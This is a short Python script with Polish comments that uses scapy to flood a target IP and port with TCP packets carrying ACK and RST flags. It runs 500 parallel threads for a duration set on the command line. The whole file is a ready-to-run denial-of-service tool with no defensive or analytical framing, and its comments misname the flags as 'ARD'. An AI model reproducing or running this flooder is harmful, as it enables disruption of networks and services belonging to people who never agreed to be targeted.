import sys
import threading
from scapy.all import *

# Funkcja do wysyłania zapytań ARD (ponowne przesłanie)
def send_ard_packets(ip, port, duration):
    start_time = time.time()
    end_time = start_time + duration

    while time.time() < end_time:
        try:
            # Tworzymy pakiet TCP z flagą ARD
            ip_packet = IP(dst=ip)
            tcp_packet = TCP(dport=port, flags="AR")

            # Łączymy pakiet IP z pakietem TCP
            packet = ip_packet / tcp_packet

            # Wysyłamy pakiet
            send(packet, verbose=False)

        except Exception as e:
            print(f"Exception: {e}")

# Funkcja startowa
def main():
    if len(sys.argv) != 4:
        print("Usage: python ard.py <ip> <port> <time>")
        return

    ip = sys.argv[1]
    port = int(sys.argv[2])
    duration = int(sys.argv[3])

    # Tworzymy listę wątków
    threads = []
    num_threads = 500

    # Tworzymy i uruchamiamy wątki
    for _ in range(num_threads):
        thread = threading.Thread(target=send_ard_packets, args=(ip, port, duration))
        thread.start()
        threads.append(thread)

    # Czekamy, aż wszystkie wątki zakończą działanie
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()
